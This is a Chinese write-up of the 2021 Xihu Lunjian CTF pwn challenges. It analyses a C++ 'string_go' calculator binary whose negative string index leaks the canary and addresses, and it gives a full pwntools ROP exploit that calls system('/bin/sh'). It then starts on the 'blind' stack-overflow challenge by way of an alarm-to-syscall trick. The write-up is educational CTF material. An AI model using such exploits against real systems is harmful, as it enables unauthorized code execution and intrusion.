# 2021西湖论剑pwn、re WP
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
这是2021西湖论剑的部分pwn和re题目，题目有一定难度，但也有相对简单的题目，对以下几道题目进行复盘总结。
## PWN -> string_go
###  题目分析
本题模仿pythonIDE使用C++编写的一个计算器，采用ptr下标溢出导致覆盖string结构的size字段来泄露栈内地址.  
保护全开，ida分析主函数如下：
    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      double v3; // xmm0_8
      char v4[32]; // [rsp+10h] [rbp-80h] BYREF
      char v5[32]; // [rsp+30h] [rbp-60h] BYREF
      char v6[40]; // [rsp+50h] [rbp-40h] BYREF
      unsigned __int64 v7; // [rsp+78h] [rbp-18h]
      v7 = __readfsqword(0x28u);
      menu();
      while ( 1 )
      {
        python_input[abi:cxx11](v4, argv);
        argv = (const char **)v4;
        std::__cxx11::basic_string,std::allocator>::basic_string(v6, v4);
        calc((__int64)v6);                        
        std::__cxx11::basic_string,std::allocator>::~basic_string(v6);
        if ( (int)v3 == 3 )
        {
          std::__cxx11::basic_string,std::allocator>::basic_string(v5, v4);
          argv = (const char **)v5;
          lative_func((__int64)v6);
          std::__cxx11::basic_string,std::allocator>::~basic_string(v6);
          std::__cxx11::basic_string,std::allocator>::~basic_string(v5);
        }
        std::__cxx11::basic_string,std::allocator>::~basic_string(v4);
      }
    }
题目先经过clac函数进行一些过滤和计算，结果如果=3则进入lative_func：
    __int64 __fastcall lative_func(__int64 a1)
    {
      __int64 value; // rax
      size_t v3; // r12
      const void *v4; // rbx
      void *v5; // rax
      int idx; // [rsp+1Ch] [rbp-A4h] BYREF
      char v8[32]; // [rsp+20h] [rbp-A0h] BYREF
      char v9[32]; // [rsp+40h] [rbp-80h] BYREF
      char ptr[32]; // [rsp+60h] [rbp-60h] BYREF
      char v11[40]; // [rsp+80h] [rbp-40h] BYREF
      unsigned __int64 v12; // [rsp+A8h] [rbp-18h]
      v12 = __readfsqword(0x28u);
      std::__cxx11::basic_string,std::allocator>::basic_string(v9);
      std::__cxx11::basic_string,std::allocator>::basic_string(ptr);
      std::__cxx11::basic_string,std::allocator>::basic_string(v11);
      std::operator>(&std::cout, ">>> ");
      std::istream::operator>>(&std::cin, &idx);   
      split(v8, ptr);
      if ( !std::vector,std::allocator>>::size(v8) && idx >(&std::cout, ">>> ");
        std::operator>>(&std::cin, ptr);          
        std::operator>(&std::cout, ">>> ");
        value = std::__cxx11::basic_string,std::allocator>::operator[](ptr, idx); 
        std::operator>>>(&std::cin, value); 
      }
      std::operator(&std::cout, ptr);  
      std::operator>(&std::cout, ">>> ");
      std::operator>>(&std::cin, v9);   
      v3 = std::__cxx11::basic_string,std::allocator>::size(v9);
      v4 = (const void *)std::__cxx11::basic_string,std::allocator>::c_str(v9);
      v5 = (void *)std::__cxx11::basic_string,std::allocator>::c_str(v11);
      memcpy(v5, v4, v3);  
      std::vector,std::allocator>>::~vector(v8);
      std::__cxx11::basic_string,std::allocator>::~basic_string(v11);
      std::__cxx11::basic_string,std::allocator>::~basic_string(ptr);
      std::__cxx11::basic_string,std::allocator>::~basic_string(v9);
      return a1;
    }
此函数存在由idx下标为负数时可以改写ptr的size，使得输出ptr的时候泄露栈地址，如下是idx=-1，输入value=0x33,*ptr=0x32的情况,此时size已经写入了0x33，变成了`0x3300000000000001`
        '>>> '                                                                                    │──────────────────────────────────────────────────────────────────────────────────────────────
    [DEBUG] Sent 0x4 bytes:                                                                       │gef➤  telescope 0x00007ffe288d8320 20
        '1+2\n'                                                                                   │0x00007ffe288d8320│+0x0000: 0x00007ffe288d8420  →  0x00007ffe288d8430  →  0x00007ffe00322b31 (
    [DEBUG] Received 0x4 bytes:                                                                   │"1+2"?)  ← $rsp
        '>>> '                                                                                    │0x00007ffe288d8328│+0x0008: 0x00007ffe288d8440  →  0x00007ffe288d8450  →  0x00007f0e00322b31 (
    [DEBUG] Sent 0x3 bytes:                                                                       │"1+2"?)
        '-1\n'                                                                                    │0x00007ffe288d8330│+0x0010: 0x00007ffe288d8350  →  0x0000000000000000
    [DEBUG] Received 0x4 bytes:                                                                   │0x00007ffe288d8338│+0x0018: 0xffffffffcfa02893
        '>>> '                                                                                    │0x00007ffe288d8340│+0x0020: 0x0000000000000000
    [DEBUG] Sent 0x2 bytes:                                                                       │0x00007ffe288d8348│+0x0028: 0x0000000000000000
        '2\n'                                                                                     │0x00007ffe288d8350│+0x0030: 0x0000000000000000
    [*] running in new terminal: ['/usr/bin/gdb', '-q', './string_go', '45127']                   │0x00007ffe288d8358│+0x0038: 0x00005624cfa02208  →   m
    [DEBUG] Created script for new terminal:                                                      │ov QWORD PTR [rbp-0x80], rbx
        #!/usr/bin/python                                                                         │0x00007ffe288d8360│+0x0040: 0x00007ffe288d8370  →  0x00000003288d8500
        import os                                                                                 │0x00007ffe288d8368│+0x0048: 0x0000000000000000
        os.execve('/usr/bin/gdb', ['/usr/bin/gdb', '-q', './string_go', '45127'], os.environ)     │0x00007ffe288d8370│+0x0050: 0x00000003288d8500
    [DEBUG] Launching a new terminal: ['/usr/bin/tmux', 'splitw', '-h', '-F#{pane_pid}', '/tmp/tmp│0x00007ffe288d8378│+0x0058: 0x4008000000000000
    8Hg7Mg']                                                                                      │0x00007ffe288d8380│+0x0060: 0x00007ffe288d8390  →  0x00005624d0930032  →  0x0000000000000000  
    [+] Waiting for debugger: Done                                                                │← $rax
    [*] Paused (press any to continue)                                                            │0x00007ffe288d8388│+0x0068: 0x3300000000000001  
    [DEBUG] Received 0x4 bytes:                                                                   │0x00007ffe288d8390│+0x0070: 0x00005624d0930032  →  0x0000000000000000
        '>>> '                                                                                    │0x00007ffe288d8398│+0x0078: 0x0000000000000000
    [DEBUG] Sent 0x2 bytes:                                                                       │0x00007ffe288d83a0│+0x0080: 0x00007ffe288d83b0  →  0x0000000000000000
        '3\n'                                                                                     │0x00007ffe288d83a8│+0x0088: 0x0000000000000000
                                                                                                  │0x00007ffe288d83b0│+0x0090: 0x0000000000000000
    [*] Paused (press any to continue)                                                            │0x00007ffe288d83b8│+0x0098: 0x00007f0e99c4dbe6  →   mov r12, QWORD PTR [rsp]
当`std::operator(&std::cout, ptr);`的时候可以泄露地址，接下来就是常规的ROP，来控制控制流了。
###  exp
    from pwn import *
    local = 1
    binary="./string_go"
    elf = ELF(binary, checksec=False)
    if local:
        context.terminal =['/usr/bin/tmux', 'splitw', '-h', '-F#{pane_pid}' ]
        p = process(binary)
        libc = ELF('./libc-2.27.so', checksec=False)
        bin_sh=0x00000000001b3e1a
        context.log_level = "debug"
    else:
        p=remote("82.157.20.104", 32000)
        libc = ELF('./libc-2.27.so', checksec=False)
        bin_sh = 0x00000000001b3e1a
    def debug_1(addr,show=[],PIE=True):
        debug_str = ""
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            for i in addr:
                debug_str+='b *{}\n'.format(str(hex(text_base+i)))
            for item in show:
                debug_str+='x /50xg {:#x}\n'.format(text_base+item)
            gdb.attach(p,debug_str)
        else:
            for i in addr:
                text_base=0
                debug_str+='b *{:#x}\n'.format(text_base+i)
            gdb.attach(p,debug_str)
    def leak(ptr,index,value):
        p.sendlineafter(">>>", index)
        p.sendlineafter(">>>", ptr)
        gdb.attach(p)
        pause()
        p.sendlineafter(">>>", value)
        p.recv()
        info=p.recv(4096,timeout=1)
        print(info)
        pause()
        return info
    p.sendlineafter(">>>","1+2")
    info=leak(str(2),str(-1),str(3))
    #debug_1([0x0000000000002415, 0x0000000000003cf3])
    # info=p.recv(0x400)
    # print(info[0:1])
    # print(info)
    # print(info)
    canary=u64(info[7*8:7*8+8])
    print("canary ==>",hex(canary))
    elf_base=u64(info[9*8:9*8+8])-elf.symbols["_start"]
    print("elf_base ==>",hex(elf_base))
    off=0x000000000021BF7#libc.symbols["__libc_start_main"]+238
    print(hex(off))
    libc_base=u64(info[0xf8:0xf8+8])-off
    print("libc_base ==>",hex(libc_base))
    prdi=0x0000000000003cf3
    ret = 0x00000000000014ce
    payload=p64(0)*3+p64(canary)+p64(0)*3+p64(ret+elf_base)+p64(elf_base+prdi)+p64(libc_base+bin_sh)+p64(libc_base+libc.symbols["system"])
    #gdb.attach(p)
    p.sendline(payload)
    #p.sendlineafter(">>>","aa")
    p.interactive()
###  总结
C++实现的程序，通过string结构体，通过idx来覆盖size大小，造成地址泄露，memcpy溢出劫持控制流。需要对c++的一些结构有了解，ida反编译出的c++代码逻辑没有c的清晰，需要仔细分析各个对象的含义。
## PWN -> blind
###  题目分析
题目附件有一个readme，如下：
    Don't try to guess the libc version or Brute-force attack.Believe me, there will be no results,but there is a general way to solve it.
看来出题人不想让我们用泄露libc或者暴力攻击的方式攻击，可能远程环境libc被改了。  
这道题目保护只开了NX，很简单的逻辑只有read函数存在溢出且没有其他可以泄露的函数，ida代码如下：
    ssize_t __fastcall main(int a1, char **a2, char **a3)
    {
      char buf[80]; // [rsp+0h] [rbp-50h] BYREF
      setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(stdout, 0LL, 2, 0LL);
      setvbuf(stderr, 0LL, 2, 0LL);
      alarm(8u);
      sleep(3u);
      return read(0, buf, 0x500uLL); 
    }
明显存在栈溢出，对于没有泄露函数且只开了NX保护的基本栈溢出情况，我们攻击的基本方法是
  1. 通过修改alarm函数的偏移使其变为syscall函数，从而调用syscall(‘/bin/sh’,0,0)来拿shell
  2. 通过修改alarm函数的偏移使其变为syscall函数，syscall调用write函数泄露alarm地址计算libc，溢出劫持控制流。